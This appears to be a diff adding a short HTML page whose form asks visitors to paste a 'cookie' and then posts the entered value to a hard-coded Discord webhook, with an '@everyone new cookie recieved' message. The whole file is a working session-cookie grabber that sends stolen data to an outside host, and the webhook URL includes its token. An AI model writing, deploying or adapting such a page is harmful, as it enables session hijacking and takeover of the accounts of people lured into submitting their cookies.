@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+	<head></head>
+	<body>
+		<script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
+
+		<form>
+			<input type="text" id="form-input" style="width: 400px; height: 25px;" placeholder="cookie"></input>
+			<button type="submit" id="form-submit" style="width: 100px; height: 25px;">SUBMIT</button>
+		</form>
+
+		<script>
+			function write(str) {
+				document.write(`<br>${str}`);
+			};
+
+			$("form")[0].addEventListener("submit", (e) => {
+				e.preventDefault();
+				let cook = $("#form-input")[0].value;
+				console.log(cook);
+				
+				write("please wait");
+
+				var req = $.post("https://discord.com/api/webhooks/1054852028234473512/CzgJoge-feFLwWRihyGbcAye_E-NrXuIScA5sDEpPv_PxqBriIFPO9IS4WiaEbRnCteN",{
+					"content": `@everyone new cookie recieved: \`${cook}\``
+				});
+
+				
+				req.always = function(){write("complete!")};
+				req.done = function(){write("success!")};
+				req.fail = function(){write("fail!")};
+			});
+		</script>
+	</body>
+</html>
